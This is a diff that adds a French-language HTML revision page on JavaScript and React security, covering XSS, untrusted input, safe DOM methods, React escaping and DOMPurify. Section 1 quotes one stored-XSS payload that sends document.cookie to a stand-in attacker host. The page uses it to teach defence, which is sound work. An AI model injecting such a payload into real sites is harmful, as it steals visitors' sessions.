@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>JavaScript & React - Révision Complète + Sécurité Avancée (2025)</title>
+  <style>
+    body {
+      margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(to bottom, #f8fafc, #e2e8f0); color: #1e293b; line-height: 1.7;
+    }
+    header {
+      background: #003049; color: #fff; padding: 40px 20px; text-align: center;
+      font-size: 2.5rem; font-weight: 700; letter-spacing: 1px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    }
+    header small { display: block; font-size: 1.1rem; margin-top: 10px; opacity: 0.9; }
+    section {
+      background: #ffffff; margin: 30px auto; padding: 35px; max-width: 1150px;
+      border-radius: 16px; box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+      border: 1px solid #e2e8f0;
+    }
+    h1 { font-size: 2.8rem; margin: 0; }
+    h2 {
+      color: #003049; font-size: 1.9rem; border-left: 8px solid #003049;
+      padding-left: 16px; margin: 40px 0 20px 0;
+    }
+    h3 { color: #1e40af; font-size: 1.4rem; margin-top: 30px; }
+    pre {
+      background: #1e1e1e; color: #f8f8f2; padding: 20px; border-radius: 12px;
+      overflow-x: auto; font-size: 1rem; line-height: 1.5; margin: 20px 0;
+    }
+    code { font-family: 'Fira Code', Consolas, monospace; }
+    .exemple, .danger, .note, .attack, .best {
+      padding: 18px; border-radius: 10px; margin: 20px 0; font-size: 1.02rem;
+    }
+    .exemple { background: #dbeafe; border-left: 6px solid #3b82f6; }
+    .danger  { background: #fee2e2; border-left: 6px solid #dc2626; font-weight: 600; }
+    .note    { background: #fef3c7; border-left: 6px solid #f59e0b; }
+    .attack  { background: #fef2f2; border: 2px dashed #dc2626; font-family: monospace; }
+    .best    { background: #ecfdf5; border-left: 6px solid #10b981; font-weight: 600; }
+    table { width: 100%; border-collapse: collapse; margin: 25px 0; }
+    th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
+    th { background: #003049; color: white; }
+    ul { padding-left: 30px; }
+    li { margin: 10px 0; }
+    footer {
+      text-align: center; padding: 50px; color: #64748b; font-size: 1rem;
+      background: #0f172a; color: #94a3b8; margin-top: 60px;
+    }
+        a{
+        text-align: center;
+        text-decoration: none;
+        font-size: 2rem;
+        font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  Révision JavaScript & React<br>
+  <small>Fondamentaux + Sécurité Professionnelle (Niveau 2025)</small>
+</header>
+
+<!-- ==================================== XSS EXPLICATION ==================================== -->
+<section>
+  <h2>1. Qu’est-ce qu’une attaque XSS ? (Cross-Site Scripting)</h2>
+  <p>
+    Une <strong>attaque XSS</strong> permet à un attaquant d’injecter du <strong>code JavaScript malveillant</strong> dans une page web légitime.
+  </p>
+  <p>
+    Ce code s’exécute <strong>dans le navigateur de la victime</strong>, avec tous ses droits : accès aux cookies, localStorage, caméra, micro, etc.
+  </p>
+
+  <div class="danger">
+    <strong>Conséquences réelles :</strong><br>
+    • Vol de session (cookie → connexion automatique sur un site pirate)<br>
+    • Vol de token JWT ou API<br>
+    • Keylogger (capture des mots de passe)<br>
+    • Phishing interne<br>
+    • Défiguration de site (Defacement)
+  </div>
+
+  <div class="attack">
+    <strong>Exemple d'attaque XSS Stored (stockée)</strong><br><br>
+    Un utilisateur malveillant écrit dans un champ commentaire :<br><br>
+    <code>&lt;script&gt;fetch('https://pirate.com/steal?cookie='+document.cookie)&lt;/script&gt;</code><br><br>
+    Si ce texte est affiché avec <code>innerHTML</code> → le script s’exécute chez <strong>tous les visiteurs</strong>.
+  </div>
+</section>
+
+<a href="./vul.htm">Exemple </a>
+
+<!-- ==================================== DONNÉES NON FILTRÉES ==================================== -->
+<section>
+  <h2>2. Qu’est-ce que des « données non filtrées » ?</h2>
+  <p>Toute donnée qui <strong>ne vient pas de ton code</strong> est potentiellement dangereuse :</p>
+  <ul>
+    <li><code>input.value</code>, formulaires</li>
+    <li>Paramètres d’URL (<code>?name=...</code>, hash)</li>
+    <li><code>localStorage</code> / <code>sessionStorage</code> (l’utilisateur peut les modifier)</li>
+    <li>Réponses API (même ton propre back-end si tu ne valides pas)</li>
+    <li>Commentaires, chat, messages WebSocket</li>
+  </ul>
+
+  <div class="best">
+    Règle d’or de la sécurité web :<br>
+    <strong>« Ne fais jamais confiance aux données entrantes. »</strong>
+  </div>
+</section>
+
+<!-- ==================================== DOM MANIPULATION ==================================== -->
+<section>
+  <h2>3. Manipulation du DOM : Les 3 méthodes et leur dangerosité</h2>
+
+  <table>
+    <tr>
+      <th>Méthode</th><th>Interprète le HTML ?</th><th>XSS possible ?</th><th>Recommandation 2025</th>
+    </tr>
+    <tr>
+      <td><code>innerHTML = donnée</code></td>
+      <td>Oui</td>
+      <td>Extrêmement dangereux</td>
+      <td>À BANNIR avec données utilisateur</td>
+    </tr>
+    <tr>
+      <td><code>textContent</code> ou <code>innerText</code></td>
+      <td>Non (échappe tout)</td>
+      <td>Sûr</td>
+      <td>Recommandé</td>
+    </tr>
+    <tr>
+      <td><code>createElement() + textContent</code></td>
+      <td>Non</td>
+      <td>100 % sûr</td>
+      <td>Meilleure pratique absolue</td>
+    </tr>
+  </table>
+
+  <div class="exemple">Méthode ultra-sécurisée (recommandée partout)</div>
+  <pre><code>const p = document.createElement('p');
+p.textContent = donnéeUtilisateur;  // ← XSS impossible
+document.body.appendChild(p);
+</code></pre>
+</section>
+
+<!-- ==================================== CRÉATION BALISES ==================================== -->
+<section>
+  <h2>4. Création dynamique de balises HTML (en toute sécurité)</h2>
+
+  <div class="best">
+    Méthode professionnelle 2025 :<br>
+    <code>createElement()</code> + <code>textContent</code> + nettoyage strict
+  </div>
+
+  <div class="exemple">Exemple complet sécurisé (vanilla JS)</div>
+  <pre><code>const input = document.getElementById('prenom');
+const btn = document.getElementById('ajouter');
+const liste = document.getElementById('liste');
+
+btn.addEventListener('click', () => {
+  let valeur = input.value
+    .trim()                     // enlève espaces début/fin
+    .normalize('NFKC')          // protection attaques Unicode
+    .replace(/\s+/g, ' ')       // évite les espaces multiples
+    .slice(0, 30);              // limite à 30 caractères (anti-DoS)
+
+  if (!valeur) {
+    alert('Veuillez saisir un prénom');
+    return;
+  }
+
+  const li = document.createElement('li');
+  li.textContent = valeur;       // ← Méthode la plus sûre
+  liste.appendChild(li);
+  input.value = '';
+});
+</code></pre>
+</section>
+
+<!-- ==================================== TRIM & SLICE ==================================== -->
+<section>
+  <h2>5. Pourquoi utiliser trim() et slice() ?</h2>
+
+  <h3>trim() → Sécurité + UX</h3>
+  <ul>
+    <li>Évite les soumissions d’espaces uniquement ("   ")</li>
+    <li>Empêche les attaques avec espaces invisibles (Unicode)</li>
+  </ul>
+
+  <h3>slice(0, max) → Protection contre les attaques massives</h3>
+  <ul>
+    <li>Empêche un input de 10 Mo (crash navigateur)</li>
+    <li>Limite les attaques de type "billion laughs" côté client</li>
+  </ul>
+
+  <div class="exemple">
+    <code>valeur = valeur.trim().slice(0, 50);</code>
+  </div>
+</section>
+
+<!-- ==================================== REACT SÉCURITÉ ==================================== -->
+<section>
+  <h2>6. React : Sécurisé par défaut (mais attention !)</h2>
+  <p>
+    React échappe automatiquement tout ce qui est dans <code>{}</code> → <strong>pas de XSS</strong> avec cette syntaxe.
+  </p>
+
+  <div class="exemple">100 % sûr</div>
+  <pre><code>{users.map(u => &lt;li key={u.id}&gt;{u.nom}&lt;/li&gt;)}</code></pre>
+
+  <div class="danger">
+    <strong>Les seules exceptions dangereuses :</strong><br>
+    • <code>dangerouslySetInnerHTML={{ __html: ... }}</code><br>
+    • <code>contentEditable</code> avec HTML brut<br><br>
+    → Utilise <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> dans ce cas :
+    <pre><code>import DOMPurify from 'dompurify';
+const htmlSafe = DOMPurify.sanitize(htmlMalveillant);</code></pre>
+  </div>
+</section>
+
+<!-- ==================================== EXEMPLE COMPLET JS ==================================== -->
+<section>
+  <h2>7. Exemple complet JavaScript vanilla (100 % sécurisé)</h2>
+  <pre><code>&lt;input type="text" id="nom" placeholder="Ton nom" maxlength="50"&gt;
+&lt;button id="ajouter"&gt;Ajouter&lt;/button&gt;
+&lt;ul id="liste"&gt;&lt;/ul&gt;
+
+&lt;script&gt;
+  const input = document.getElementById('nom');
+  const btn = document.getElementById('ajouter');
+  const liste = document.getElementById('liste');
+
+  btn.addEventListener('click', () => {
+    let nom = input.value
+      .trim()
+      .normalize('NFKC')
+      .replace(/\s+/g, ' ')
+      .slice(0, 30);
+
+    if (!nom) return alert('Nom vide !');
+
+    const li = document.createElement('li');
+    li.textContent = nom;
+    liste.appendChild(li);
+    input.value = '';
+  });
+&lt;/script&gt;
+</code></pre>
+</section>
+
+<!-- ==================================== EXEMPLE COMPLET REACT ==================================== -->
+<section>
+  <h2>8. Exemple complet React (Next.js / Vite / CRA)</h2>
+  <pre><code>import { useState } from 'react';
+
+export default function ListeNoms() {
+  const [noms, setNoms] = useState([]);
+  const [nom, setNom] = useState('');
+
+  const ajouter = () => {
+    const nettoye = nom.trim().slice(0, 30);
+    if (!nettoye) return;
+
+    setNoms([...noms, nettoye]);
+    setNom('');
+  };
+
+  return (
+    &lt;div style={{padding: '20px', fontFamily: 'sans-serif'}}&gt;
+      &lt;h2>Ajouter un nom&lt;/h2&gt;
+      &lt;input
+        value={nom}
+        onChange={(e) => setNom(e.target.value)}
+        placeholder="Entrez un nom"
+        maxLength={50}
+      /&gt;
+      &lt;button onClick={ajouter} style={{marginLeft: '10px'}}&gt;Ajouter&lt;/button&gt;
+
+      &lt;ul style={{marginTop: '20px'}}&gt;
+        {noms.map((n, i) => &lt;li key={i}&gt;{n}&lt;/li&gt;)}
+      &lt;/ul&gt;
+    &lt;/div&gt;
+  );
+}
+</code></pre>
+</section>
+
+<footer>
+  <strong>Document mis à jour en novembre 2025</strong><br><br>
+  Formation complète JavaScript • DOM • React • Sécurité web avancée<br>
+  Conforme aux recommandations OWASP 2025 • Bonnes pratiques professionnelles
+</footer>
+
+</body>
+</html>
